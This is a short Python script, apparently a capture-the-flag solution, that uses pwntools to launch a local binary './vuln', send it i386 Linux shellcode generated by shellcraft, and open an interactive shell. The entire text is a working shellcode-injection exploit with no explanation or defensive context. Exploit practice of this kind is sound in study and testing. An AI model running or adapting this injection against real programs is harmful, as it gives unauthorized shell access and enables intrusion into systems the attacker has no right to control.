from pwn import *

sh = process('./vuln')

sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()